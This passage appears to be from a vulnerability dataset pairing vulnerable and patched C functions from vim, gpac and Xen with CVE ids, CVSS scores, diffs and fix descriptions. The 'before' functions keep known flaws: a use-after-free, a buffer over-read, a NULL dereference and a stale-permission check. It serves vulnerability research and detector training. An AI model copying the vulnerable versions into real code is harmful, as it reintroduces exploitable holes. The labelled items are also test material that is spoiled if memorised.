    typval_T	VAR_4;
    int		VAR_5;
    int		VAR_6 = in_vim9script();
    garray_T    *VAR_7 = VAR_3 == NULL ? NULL : &VAR_3->eval_ga;
    garray_T    *VAR_8 = VAR_3 == NULL ? NULL : &VAR_3->eval_freega;
    int		VAR_9 = VAR_3 == NULL ? 0 : VAR_3->eval_flags;
    int		VAR_10 = VAR_3 == NULL
			       ? FALSE : (VAR_3->eval_flags & VAR_11);

    if (VAR_6 && VAR_10
	       && (VAR_3->eval_cookie != NULL || VAR_3->eval_cctx != NULL))
    {
	ga_init2(VAR_7, sizeof(char_u *), 10);
	/* COMMENT_0 */
	if (ga_grow(VAR_7, 1) == VAR_12)
	    ++VAR_7->ga_len;
	ga_init2(VAR_8, sizeof(char_u *), 10);
    }
    *VAR_1 = *VAR_0;

    /* COMMENT_1 */
    if (VAR_3 != NULL)
	VAR_3->eval_flags &= ~VAR_11;
    *VAR_0 = skipwhite(*VAR_0);
    VAR_5 = eval1(VAR_0, &VAR_4, VAR_3);
    *VAR_2 = *VAR_0;
    if (VAR_3 != NULL)
	VAR_3->eval_flags = VAR_9;

    if (VAR_6 && VAR_10
	    && (VAR_3->eval_cookie != NULL || VAR_3->eval_cctx != NULL))
    {
	if (VAR_3->eval_ga.ga_len == 1)
	{
	    /* COMMENT_2 */
	    ga_clear(VAR_7);
	    VAR_7->ga_itemsize = 0;
	}
	else
	{
	    char_u	    *VAR_13;
	    size_t	    VAR_14 = STRLEN(*VAR_0);

	    /* COMMENT_3 */
	    *((char_u **)VAR_7->ga_data) = *VAR_1;
	    VAR_13 = ga_concat_strings(VAR_7, "" "");

	    /* COMMENT_4 */
	    if (VAR_3->eval_cookie != NULL)
	    {
		/* COMMENT_5 */
		*((char_u **)VAR_7->ga_data) = NULL;
		/* COMMENT_6 */
		/* COMMENT_7 */
		free_eval_tofree_later(VAR_3);
		VAR_3->eval_tofree =
				    ((char_u **)VAR_7->ga_data)[VAR_7->ga_len - 1];
		((char_u **)VAR_7->ga_data)[VAR_7->ga_len - 1] = NULL;
		ga_clear_strings(VAR_7);
	    }
	    else
	    {
		ga_clear(VAR_7);

		/* COMMENT_8 */
		ga_clear_strings(VAR_8);
	    }

	    VAR_7->ga_itemsize = 0;
	    if (VAR_13 == NULL)
		return VAR_15;
	    *VAR_1 = VAR_13;
	    vim_free(VAR_3->eval_tofree_lambda);
	    VAR_3->eval_tofree_lambda = VAR_13;
	    /* COMMENT_9 */
	    *VAR_2 = *VAR_1 + STRLEN(*VAR_1) - VAR_14;
	}
    }

    return VAR_5;
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/eval.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -58,8 +58,8 @@
 		// Do not free the first line, the caller can still use it.
 		*((char_u **)gap->ga_data) = NULL;
 		// Do not free the last line, ""arg"" points into it, free it
-		// later.
-		vim_free(evalarg->eval_tofree);
+		// later.  Also free ""eval_tofree"" later if needed.
+		free_eval_tofree_later(evalarg);
 		evalarg->eval_tofree =
 				    ((char_u **)gap->ga_data)[gap->ga_len - 1];
 		((char_u **)gap->ga_data)[gap->ga_len - 1] = NULL;","{'deleted_lines': ['\t\t// later.', '\t\tvim_free(evalarg->eval_tofree);'], 'added_lines': ['\t\t// later.  Also free ""eval_tofree"" later if needed.', '\t\tfree_eval_tofree_later(evalarg);']}",True,Use After Free in GitHub repository vim/vim prior to 9.0.0225.,7.8,HIGH,2,valid,2022-08-18T12:28:31Z,4
CVE-2022-47024,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0339: no check if the return value of XChangeGC() is NULL

Problem:    No check if the return value of XChangeGC() is NULL.
Solution:   Only use the return value when it is not NULL. (closes #11020)",a63ad78ed31e36dbdf3a9cd28071dcdbefce7d19,https://github.com/vim/vim/commit/a63ad78ed31e36dbdf3a9cd28071dcdbefce7d19,src/gui_x11.c,gui_x11_create_blank_mouse,"static Cursor
gui_x11_create_blank_mouse(void)
{
Pixmap blank_pixmap = XCreatePixmap(gui.dpy, gui.wid, 1, 1, 1);
GC gc = XCreateGC(gui.dpy, blank_pixmap, (unsigned long)0, (XGCValues*)0);
XDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);
XFreeGC(gui.dpy, gc);
return XCreatePixmapCursor(gui.dpy, blank_pixmap, blank_pixmap,
(XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);
}","static Cursor
gui_x11_create_blank_mouse(void)
{
Pixmap VAR_0 = XCreatePixmap(VAR_1.dpy, VAR_1.wid, 1, 1, 1);
GC VAR_2 = XCreateGC(VAR_1.dpy, VAR_0, (unsigned long)0, (XGCValues*)0);
XDrawPoint(VAR_1.dpy, VAR_0, VAR_2, 0, 0);
XFreeGC(VAR_1.dpy, VAR_2);
return XCreatePixmapCursor(VAR_1.dpy, VAR_0, VAR_0,
(XColor*)&VAR_1.norm_pixel, (XColor*)&VAR_1.norm_pixel, 0, 0);
}",vim/a63ad78ed31e36dbdf3a9cd28071dcdbefce7d19/gui_x11.c/vul/before/0.json,"static Cursor
gui_x11_create_blank_mouse(void)
{
    Pixmap blank_pixmap = XCreatePixmap(gui.dpy, gui.wid, 1, 1, 1);
    GC gc = XCreateGC(gui.dpy, blank_pixmap, (unsigned long)0, (XGCValues*)0);

    if (gc != NULL)
    {
	XDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);
	XFreeGC(gui.dpy, gc);
    }
    return XCreatePixmapCursor(gui.dpy, blank_pixmap, blank_pixmap,
		     (XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);
}","static Cursor
gui_x11_create_blank_mouse(void)
{
    Pixmap VAR_0 = XCreatePixmap(VAR_1.dpy, VAR_1.wid, 1, 1, 1);
    GC VAR_2 = XCreateGC(VAR_1.dpy, VAR_0, (unsigned long)0, (XGCValues*)0);

    if (VAR_2 != NULL)
    {
	XDrawPoint(VAR_1.dpy, VAR_0, VAR_2, 0, 0);
	XFreeGC(VAR_1.dpy, VAR_2);
    }
    return XCreatePixmapCursor(VAR_1.dpy, VAR_0, VAR_0,
		     (XColor*)&VAR_1.norm_pixel, (XColor*)&VAR_1.norm_pixel, 0, 0);
}",vim/a63ad78ed31e36dbdf3a9cd28071dcdbefce7d19/gui_x11.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,8 +3,12 @@
 {
     Pixmap blank_pixmap = XCreatePixmap(gui.dpy, gui.wid, 1, 1, 1);
     GC gc = XCreateGC(gui.dpy, blank_pixmap, (unsigned long)0, (XGCValues*)0);
-    XDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);
-    XFreeGC(gui.dpy, gc);
+
+    if (gc != NULL)
+    {
+	XDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);
+	XFreeGC(gui.dpy, gc);
+    }
     return XCreatePixmapCursor(gui.dpy, blank_pixmap, blank_pixmap,
-	    (XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);
+		     (XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);
 }","{'deleted_lines': ['    XDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);', '    XFreeGC(gui.dpy, gc);', '\t    (XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);'], 'added_lines': ['', '    if (gc != NULL)', '    {', '\tXDrawPoint(gui.dpy, blank_pixmap, gc, 0, 0);', '\tXFreeGC(gui.dpy, gc);', '    }', '\t\t     (XColor*)&gui.norm_pixel, (XColor*)&gui.norm_pixel, 0, 0);']}",True,A null pointer dereference issue was discovered in function gui_x11_create_blank_mouse in gui_x11.c in vim 8.1.2269 thru 9.0.0339 allows attackers to cause denial of service or other unspecified impacts.,7.8,HIGH,2,valid,2022-08-31T11:01:54Z,4
CVE-2022-3178,['CWE-125'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,fixed #2255,77510778516803b7f7402d7423c6d6bef50254c3,https://github.com/gpac/gpac/commit/77510778516803b7f7402d7423c6d6bef50254c3,src/isomedia/box_code_base.c,xtra_box_read,"GF_Err xtra_box_read(GF_Box *s, GF_BitStream *bs)
{
GF_XtraBox *ptr = (GF_XtraBox *)s;
while (ptr->size) {
GF_XtraTag *tag;
u32 prop_type = 0;
char *data=NULL, *data2=NULL;
ISOM_DECREASE_SIZE_NO_ERR(ptr, 8)
s32 tag_size = gf_bs_read_u32(bs);
u32 name_size = gf_bs_read_u32(bs);
if (tag_size < 8) return GF_ISOM_INVALID_FILE;
tag_size -= 8;
if ((tag_size>ptr->size) || (name_size>ptr->size)) {
return GF_ISOM_INVALID_FILE;
}
ISOM_DECREASE_SIZE_NO_ERR(ptr, 10)
ISOM_DECREASE_SIZE_NO_ERR(ptr, name_size)
data = gf_malloc(sizeof(char) * (name_size+1));
gf_bs_read_data(bs, data, name_size);
data[name_size] = 0;
tag_size-=name_size;
u32 flags = gf_bs_read_u32(bs);
u32 prop_size = gf_bs_read_u32(bs);
tag_size-=8;
if (prop_size>4) {
tag_size-=2;
prop_type = gf_bs_read_u16(bs);
prop_size -= 6;
ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
data2 = gf_malloc(sizeof(char) * (prop_size+2));
gf_bs_read_data(bs, data2, prop_size);
data2[prop_size] = 0;
data2[prop_size+1] = 0;
tag_size-=prop_size;
} else {
prop_size = 0;
}
GF_SAFEALLOC(tag, GF_XtraTag)
tag->flags = flags;
tag->name = data;
tag->prop_size = prop_size;
tag->prop_value = data2;
tag->prop_type = prop_type;
gf_list_add(ptr->tags, tag);
if (tag_size) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[isom] invalid tag size in Xtra !\n""));
}
}
return GF_OK;
}","GF_Err xtra_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
GF_XtraBox *VAR_2 = (GF_XtraBox *)VAR_0;
while (VAR_2->size) {
GF_XtraTag *VAR_3;
u32 VAR_4 = 0;
char *VAR_5=NULL, *VAR_6=NULL;
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 8)
s32 VAR_7 = gf_bs_read_u32(VAR_1);
u32 VAR_8 = gf_bs_read_u32(VAR_1);
if (VAR_7 < 8) return VAR_9;
VAR_7 -= 8;
if ((VAR_7>VAR_2->size) || (VAR_8>VAR_2->size)) {
return VAR_9;
}
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 10)
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_8)
VAR_5 = gf_malloc(sizeof(char) * (VAR_8+1));
gf_bs_read_data(VAR_1, VAR_5, VAR_8);
VAR_5[VAR_8] = 0;
VAR_7-=VAR_8;
u32 VAR_10 = gf_bs_read_u32(VAR_1);
u32 VAR_11 = gf_bs_read_u32(VAR_1);
VAR_7-=8;
if (VAR_11>4) {
VAR_7-=2;
VAR_4 = gf_bs_read_u16(VAR_1);
VAR_11 -= 6;
ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_11)
VAR_6 = gf_malloc(sizeof(char) * (VAR_11+2));
gf_bs_read_data(VAR_1, VAR_6, VAR_11);
VAR_6[VAR_11] = 0;
VAR_6[VAR_11+1] = 0;
VAR_7-=VAR_11;
} else {
VAR_11 = 0;
}
GF_SAFEALLOC(VAR_3, GF_XtraTag)
VAR_3->flags = VAR_10;
VAR_3->name = VAR_5;
VAR_3->prop_size = VAR_11;
VAR_3->prop_value = VAR_6;
VAR_3->prop_type = VAR_4;
gf_list_add(VAR_2->tags, VAR_3);
if (VAR_7) {
GF_LOG(VAR_12, VAR_13, (""[isom] invalid tag size in Xtra !\n""));
}
}
return VAR_14;
}",gpac/77510778516803b7f7402d7423c6d6bef50254c3/box_code_base.c/vul/before/0.json,"GF_Err xtra_box_read(GF_Box *s, GF_BitStream *bs)
{
	GF_XtraBox *ptr = (GF_XtraBox *)s;
	while (ptr->size) {
		GF_XtraTag *tag;
		u32 prop_type = 0;

		char *data=NULL, *data2=NULL;
		ISOM_DECREASE_SIZE_NO_ERR(ptr, 8)
		s32 tag_size = gf_bs_read_u32(bs);
		u32 name_size = gf_bs_read_u32(bs);
		if (tag_size < 8) return GF_ISOM_INVALID_FILE;

		tag_size -= 8;
		if ((tag_size>ptr->size) || (name_size>ptr->size)) {
			return GF_ISOM_INVALID_FILE;
		}
		ISOM_DECREASE_SIZE_NO_ERR(ptr, 10)

		ISOM_DECREASE_SIZE_NO_ERR(ptr, name_size)
		data = gf_malloc(sizeof(char) * (name_size+1));
		gf_bs_read_data(bs, data, name_size);
		data[name_size] = 0;
		tag_size-=name_size;

		u32 flags = gf_bs_read_u32(bs);
		u32 prop_size = gf_bs_read_u32(bs);
		tag_size-=8;

		if (prop_size>4) {
			tag_size-=2;
			prop_type = gf_bs_read_u16(bs);
			prop_size -= 6;
			ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
			//add 3 extra bytes for UTF16 case string dump (3 because we need 0-aligned short value)
			data2 = gf_malloc(sizeof(char) * (prop_size+3));
			gf_bs_read_data(bs, data2, prop_size);
			data2[prop_size] = 0;
			data2[prop_size+1] = 0;
			data2[prop_size+2] = 0;
			tag_size-=prop_size;
		} else {
			prop_size = 0;
		}
		GF_SAFEALLOC(tag, GF_XtraTag)
		tag->flags = flags;
		tag->name = data;
		tag->prop_size = prop_size;
		tag->prop_value = data2;
		tag->prop_type = prop_type;
		gf_list_add(ptr->tags, tag);

		if (tag_size) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[isom] invalid tag size in Xtra !\n""));
		}
	}
	return GF_OK;
}","GF_Err xtra_box_read(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
	GF_XtraBox *VAR_2 = (GF_XtraBox *)VAR_0;
	while (VAR_2->size) {
		GF_XtraTag *VAR_3;
		u32 VAR_4 = 0;

		char *VAR_5=NULL, *VAR_6=NULL;
		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 8)
		s32 VAR_7 = gf_bs_read_u32(VAR_1);
		u32 VAR_8 = gf_bs_read_u32(VAR_1);
		if (VAR_7 < 8) return VAR_9;

		VAR_7 -= 8;
		if ((VAR_7>VAR_2->size) || (VAR_8>VAR_2->size)) {
			return VAR_9;
		}
		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, 10)

		ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_8)
		VAR_5 = gf_malloc(sizeof(char) * (VAR_8+1));
		gf_bs_read_data(VAR_1, VAR_5, VAR_8);
		VAR_5[VAR_8] = 0;
		VAR_7-=VAR_8;

		u32 VAR_10 = gf_bs_read_u32(VAR_1);
		u32 VAR_11 = gf_bs_read_u32(VAR_1);
		VAR_7-=8;

		if (VAR_11>4) {
			VAR_7-=2;
			VAR_4 = gf_bs_read_u16(VAR_1);
			VAR_11 -= 6;
			ISOM_DECREASE_SIZE_NO_ERR(VAR_2, VAR_11)
			/* COMMENT_0 */
			VAR_6 = gf_malloc(sizeof(char) * (VAR_11+3));
			gf_bs_read_data(VAR_1, VAR_6, VAR_11);
			VAR_6[VAR_11] = 0;
			VAR_6[VAR_11+1] = 0;
			VAR_6[VAR_11+2] = 0;
			VAR_7-=VAR_11;
		} else {
			VAR_11 = 0;
		}
		GF_SAFEALLOC(VAR_3, GF_XtraTag)
		VAR_3->flags = VAR_10;
		VAR_3->name = VAR_5;
		VAR_3->prop_size = VAR_11;
		VAR_3->prop_value = VAR_6;
		VAR_3->prop_type = VAR_4;
		gf_list_add(VAR_2->tags, VAR_3);

		if (VAR_7) {
			GF_LOG(VAR_12, VAR_13, (""[isom] invalid tag size in Xtra !\n""));
		}
	}
	return VAR_14;
}",gpac/77510778516803b7f7402d7423c6d6bef50254c3/box_code_base.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -32,11 +32,12 @@
 			prop_type = gf_bs_read_u16(bs);
 			prop_size -= 6;
 			ISOM_DECREASE_SIZE_NO_ERR(ptr, prop_size)
-			//add 2 extra bytes for UTF16 case string dump
-			data2 = gf_malloc(sizeof(char) * (prop_size+2));
+			//add 3 extra bytes for UTF16 case string dump (3 because we need 0-aligned short value)
+			data2 = gf_malloc(sizeof(char) * (prop_size+3));
 			gf_bs_read_data(bs, data2, prop_size);
 			data2[prop_size] = 0;
 			data2[prop_size+1] = 0;
+			data2[prop_size+2] = 0;
 			tag_size-=prop_size;
 		} else {
 			prop_size = 0;","{'deleted_lines': ['\t\t\t//add 2 extra bytes for UTF16 case string dump', '\t\t\tdata2 = gf_malloc(sizeof(char) * (prop_size+2));'], 'added_lines': ['\t\t\t//add 3 extra bytes for UTF16 case string dump (3 because we need 0-aligned short value)', '\t\t\tdata2 = gf_malloc(sizeof(char) * (prop_size+3));', '\t\t\tdata2[prop_size+2] = 0;']}",True,Buffer Over-read in GitHub repository gpac/gpac prior to 2.1.0-DEV.,7.8,HIGH,2,valid,2022-09-12T09:46:55Z,4
CVE-2022-42320,['CWE-459'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,1,xen-project/xen,"tools/xenstore: fix checking node permissions

Today chk_domain_generation() is being used to check whether a node
permission entry is still valid or whether it is referring to a domain
no longer existing. This is done by comparing the node's and the
domain's generation count.

In case no struct domain is existing for a checked domain, but the
domain itself is valid, chk_domain_generation() assumes it is being
called due to the first node created for a new domain and it will
return success.

This might be wrong in case the checked permission is related to an
old domain, which has just been replaced with a new domain using the
same domid.

Fix that by letting chk_domain_generation() fail in case a struct
domain isn't found. In order to cover the case of the first node for
a new domain try to allocate the needed struct domain explicitly when
processing the related SET_PERMS command. In case a referenced domain
isn't existing, flag the related permission to be ignored right away.

This is XSA-417 / CVE-2022-42320.

Signed-off-by: Juergen Gross <jgross@suse.com>
Reviewed-by: Julien Grall <jgrall@amazon.com>",ab128218225d3542596ca3a02aee80d55494bef8,https://github.com/xen-project/xen/commit/ab128218225d3542596ca3a02aee80d55494bef8,tools/xenstore/xenstored_domain.c,domain_adjust_node_perms,"int domain_adjust_node_perms(struct connection *conn, struct node *node)
{
unsigned int i;
int ret;
ret = chk_domain_generation(node->perms.p[0].id, node->generation);
if (ret < 0)
return errno;
if (!ret) {
node->perms.p[0].id = priv_domid;
}
for (i = 1; i < node->perms.num; i++) {
if (node->perms.p[i].perms & XS_PERM_IGNORE)
continue;
ret = chk_domain_generation(node->perms.p[i].id,
node->generation);
if (ret < 0)
return errno;
if (!ret)
node->perms.p[i].perms |= XS_PERM_IGNORE;
}
return 0;
}","int domain_adjust_node_perms(struct connection *VAR_0, struct node *node)
{
unsigned int VAR_1;
int VAR_2;
VAR_2 = chk_domain_generation(node->perms.p[0].id, node->generation);
if (VAR_2 < 0)
return VAR_3;
if (!VAR_2) {
node->perms.p[0].id = VAR_4;
}
for (VAR_1 = 1; VAR_1 < node->perms.num; VAR_1++) {
if (node->perms.p[VAR_1].perms & VAR_5)
continue;
VAR_2 = chk_domain_generation(node->perms.p[VAR_1].id,
node->generation);
if (VAR_2 < 0)
return VAR_3;
if (!VAR_2)
node->perms.p[VAR_1].perms |= VAR_5;
}
return 0;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_domain.c/vul/before/0.json,"int domain_adjust_node_perms(struct connection *conn, struct node *node)
{
	unsigned int i;
	int ret;

	ret = chk_domain_generation(node->perms.p[0].id, node->generation);

	/* If the owner doesn't exist any longer give it to priv domain. */
	if (!ret) {
		/*
		 * In theory we'd need to update the number of dom0 nodes here,
		 * but we could be called for a read of the node. So better
		 * avoid the risk to overflow the node count of dom0.
		 */
		node->perms.p[0].id = priv_domid;
	}

	for (i = 1; i < node->perms.num; i++) {
		if (node->perms.p[i].perms & XS_PERM_IGNORE)
			continue;
		ret = chk_domain_generation(node->perms.p[i].id,
					    node->generation);
		if (!ret)
			node->perms.p[i].perms |= XS_PERM_IGNORE;
	}

	return 0;
}","int domain_adjust_node_perms(struct connection *VAR_0, struct node *node)
{
	unsigned int VAR_1;
	int VAR_2;

	VAR_2 = chk_domain_generation(node->perms.p[0].id, node->generation);

	/* COMMENT_0 */
	if (!VAR_2) {
		/* COMMENT_1 */
                                                                 
                                                             
                                                       
     
		node->perms.p[0].id = VAR_3;
	}

	for (VAR_1 = 1; VAR_1 < node->perms.num; VAR_1++) {
		if (node->perms.p[VAR_1].perms & VAR_4)
			continue;
		VAR_2 = chk_domain_generation(node->perms.p[VAR_1].id,
					    node->generation);
		if (!VAR_2)
			node->perms.p[VAR_1].perms |= VAR_4;
	}

	return 0;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_domain.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -4,8 +4,6 @@
 	int ret;
 
 	ret = chk_domain_generation(node->perms.p[0].id, node->generation);
-	if (ret < 0)
-		return errno;
 
 	/* If the owner doesn't exist any longer give it to priv domain. */
 	if (!ret) {
@@ -22,8 +20,6 @@
 			continue;
 		ret = chk_domain_generation(node->perms.p[i].id,
 					    node->generation);
-		if (ret < 0)
-			return errno;
 		if (!ret)
 			node->perms.p[i].perms |= XS_PERM_IGNORE;
 	}","{'deleted_lines': ['\tif (ret < 0)', '\t\treturn errno;', '\t\tif (ret < 0)', '\t\t\treturn errno;'], 'added_lines': []}",True,"Xenstore: Guests can get access to Xenstore nodes of deleted domains Access rights of Xenstore nodes are per domid. When a domain is gone, there might be Xenstore nodes left with access rights containing the domid of the removed domain. This is normally no problem, as those access right entries will be corrected when such a node is written later. There is a small time window when a new domain is created, where the access rights of a past domain with the same domid as the new one will be regarded to be still valid, leading to the new domain being able to get access to a node which was meant to be accessible by the removed domain. For this to happen another domain needs to write the node before the newly created domain is being introduced to Xenstore by dom0.",7.0,HIGH,2,valid,2022-09-13T05:35:10Z,4
CVE-2022-42320,['CWE-459'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,1,xen-project/xen,"tools/xenstore: fix checking node permissions

Today chk_domain_generation() is being used to check whether a node
permission entry is still valid or whether it is referring to a domain
no longer existing. This is done by comparing the node's and the
domain's generation count.

In case no struct domain is existing for a checked domain, but the
domain itself is valid, chk_domain_generation() assumes it is being
called due to the first node created for a new domain and it will
return success.

This might be wrong in case the checked permission is related to an
old domain, which has just been replaced with a new domain using the
same domid.

Fix that by letting chk_domain_generation() fail in case a struct
domain isn't found. In order to cover the case of the first node for
a new domain try to allocate the needed struct domain explicitly when
processing the related SET_PERMS command. In case a referenced domain
isn't existing, flag the related permission to be ignored right away.

This is XSA-417 / CVE-2022-42320.

Signed-off-by: Juergen Gross <jgross@suse.com>
Reviewed-by: Julien Grall <jgrall@amazon.com>",ab128218225d3542596ca3a02aee80d55494bef8,https://github.com/xen-project/xen/commit/ab128218225d3542596ca3a02aee80d55494bef8,tools/xenstore/xenstored_core.c,do_set_perms,"static int do_set_perms(const void *ctx, struct connection *conn,
struct buffered_data *in)
{
struct node_perms perms, old_perms;
char *name, *permstr;
struct node *node;
perms.num = xs_count_strings(in->buffer, in->used);
if (perms.num < 2)
return EINVAL;
perms.num--;
if (domain_is_unprivileged(conn) &&
perms.num > quota_nb_perms_per_node)
return ENOSPC;
permstr = in->buffer + strlen(in->buffer) + 1;
perms.p = talloc_array(ctx, struct xs_permissions, perms.num);
if (!perms.p)
return ENOMEM;
if (!xs_strings_to_perms(perms.p, perms.num, permstr))
return errno;
if (strstarts(in->buffer, ""@"")) {
if (set_perms_special(conn, in->buffer, &perms))
return errno;
send_ack(conn, XS_SET_PERMS);
return 0;
}
node = get_node_canonicalized(conn, ctx, in->buffer, &name,
XS_PERM_WRITE | XS_PERM_OWNER);
if (!node)
return errno;
if (domain_is_unprivileged(conn) &&
perms.p[0].id != node->perms.p[0].id)
return EPERM;
old_perms = node->perms;
domain_entry_dec(conn, node);
node->perms = perms;
if (domain_entry_inc(conn, node)) {
node->perms = old_perms;
domain_entry_inc(conn, node);
return ENOMEM;
}
if (write_node(conn, node, false)) {
int saved_errno = errno;
domain_entry_dec(conn, node);
node->perms = old_perms;
domain_entry_inc(conn, node);
errno = saved_errno;
return errno;
}
fire_watches(conn, ctx, name, node, false, &old_perms);
send_ack(conn, XS_SET_PERMS);
return 0;
}","static int do_set_perms(const void *VAR_0, struct connection *VAR_1,
struct buffered_data *VAR_2)
{
struct node_perms VAR_3, VAR_4;
char *VAR_5, *VAR_6;
struct node *node;
VAR_3.num = xs_count_strings(VAR_2->buffer, VAR_2->used);
if (VAR_3.num < 2)
return VAR_7;
VAR_3.num--;
if (domain_is_unprivileged(VAR_1) &&
VAR_3.num > VAR_8)
return VAR_9;
VAR_6 = VAR_2->buffer + strlen(VAR_2->buffer) + 1;
VAR_3.p = talloc_array(VAR_0, struct VAR_10, VAR_3.num);
if (!VAR_3.p)
return VAR_11;
if (!xs_strings_to_perms(VAR_3.p, VAR_3.num, VAR_6))
return VAR_12;
if (strstarts(VAR_2->buffer, ""@"")) {
if (set_perms_special(VAR_1, VAR_2->buffer, &VAR_3))
return VAR_12;
send_ack(VAR_1, VAR_13);
return 0;
}
node = get_node_canonicalized(VAR_1, VAR_0, VAR_2->buffer, &VAR_5,
VAR_14 | VAR_15);
if (!node)
return VAR_12;
if (domain_is_unprivileged(VAR_1) &&
VAR_3.p[0].id != node->perms.p[0].id)
return VAR_16;
VAR_4 = node->perms;
domain_entry_dec(VAR_1, node);
node->perms = VAR_3;
if (domain_entry_inc(VAR_1, node)) {
node->perms = VAR_4;
domain_entry_inc(VAR_1, node);
return VAR_11;
}
if (write_node(VAR_1, node, false)) {
int VAR_17 = VAR_12;
domain_entry_dec(VAR_1, node);
node->perms = VAR_4;
domain_entry_inc(VAR_1, node);
VAR_12 = VAR_17;
return VAR_12;
}
fire_watches(VAR_1, VAR_0, VAR_5, node, false, &VAR_4);
send_ack(VAR_1, VAR_13);
return 0;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_core.c/vul/before/0.json,"static int do_set_perms(const void *ctx, struct connection *conn,
			struct buffered_data *in)
{
	struct node_perms perms, old_perms;
	char *name, *permstr;
	struct node *node;

	perms.num = xs_count_strings(in->buffer, in->used);
	if (perms.num < 2)
		return EINVAL;

	perms.num--;
	if (domain_is_unprivileged(conn) &&
	    perms.num > quota_nb_perms_per_node)
		return ENOSPC;

	permstr = in->buffer + strlen(in->buffer) + 1;

	perms.p = talloc_array(ctx, struct xs_permissions, perms.num);
	if (!perms.p)
		return ENOMEM;
	if (!xs_strings_to_perms(perms.p, perms.num, permstr))
		return errno;

	if (domain_alloc_permrefs(&perms) < 0)
		return ENOMEM;
	if (perms.p[0].perms & XS_PERM_IGNORE)
		return ENOENT;

	/* First arg is node name. */
	if (strstarts(in->buffer, ""@"")) {
		if (set_perms_special(conn, in->buffer, &perms))
			return errno;
		send_ack(conn, XS_SET_PERMS);
		return 0;
	}

	/* We must own node to do this (tools can do this too). */
	node = get_node_canonicalized(conn, ctx, in->buffer, &name,
				      XS_PERM_WRITE | XS_PERM_OWNER);
	if (!node)
		return errno;

	/* Unprivileged domains may not change the owner. */
	if (domain_is_unprivileged(conn) &&
	    perms.p[0].id != node->perms.p[0].id)
		return EPERM;

	old_perms = node->perms;
	domain_entry_dec(conn, node);
	node->perms = perms;
	if (domain_entry_inc(conn, node)) {
		node->perms = old_perms;
		/*
		 * This should never fail because we had a reference on the
		 * domain before and Xenstored is single-threaded.
		 */
		domain_entry_inc(conn, node);
		return ENOMEM;
	}

	if (write_node(conn, node, false)) {
		int saved_errno = errno;

		domain_entry_dec(conn, node);
		node->perms = old_perms;
		/* No failure possible as above. */
		domain_entry_inc(conn, node);

		errno = saved_errno;
		return errno;
	}

	fire_watches(conn, ctx, name, node, false, &old_perms);
	send_ack(conn, XS_SET_PERMS);

	return 0;
}","static int do_set_perms(const void *VAR_0, struct connection *VAR_1,
			struct buffered_data *VAR_2)
{
	struct node_perms VAR_3, VAR_4;
	char *VAR_5, *VAR_6;
	struct node *node;

	VAR_3.num = xs_count_strings(VAR_2->buffer, VAR_2->used);
	if (VAR_3.num < 2)
		return VAR_7;

	VAR_3.num--;
	if (domain_is_unprivileged(VAR_1) &&
	    VAR_3.num > VAR_8)
		return VAR_9;

	VAR_6 = VAR_2->buffer + strlen(VAR_2->buffer) + 1;

	VAR_3.p = talloc_array(VAR_0, struct VAR_10, VAR_3.num);
	if (!VAR_3.p)
		return VAR_11;
	if (!xs_strings_to_perms(VAR_3.p, VAR_3.num, VAR_6))
		return VAR_12;

	if (domain_alloc_permrefs(&VAR_3) < 0)
		return VAR_11;
	if (VAR_3.p[0].perms & VAR_13)
		return VAR_14;

	/* COMMENT_0 */
	if (strstarts(VAR_2->buffer, ""@"")) {
		if (set_perms_special(VAR_1, VAR_2->buffer, &VAR_3))
			return VAR_12;
		send_ack(VAR_1, VAR_15);
		return 0;
	}

	/* COMMENT_1 */
	node = get_node_canonicalized(VAR_1, VAR_0, VAR_2->buffer, &VAR_5,
				      VAR_16 | VAR_17);
	if (!node)
		return VAR_12;

	/* COMMENT_2 */
	if (domain_is_unprivileged(VAR_1) &&
	    VAR_3.p[0].id != node->perms.p[0].id)
		return VAR_18;

	VAR_4 = node->perms;
	domain_entry_dec(VAR_1, node);
	node->perms = VAR_3;
	if (domain_entry_inc(VAR_1, node)) {
		node->perms = VAR_4;
		/* COMMENT_3 */
                                                             
                                                    
     
		domain_entry_inc(VAR_1, node);
		return VAR_11;
	}

	if (write_node(VAR_1, node, false)) {
		int VAR_19 = VAR_12;

		domain_entry_dec(VAR_1, node);
		node->perms = VAR_4;
		/* COMMENT_7 */
		domain_entry_inc(VAR_1, node);

		VAR_12 = VAR_19;
		return VAR_12;
	}

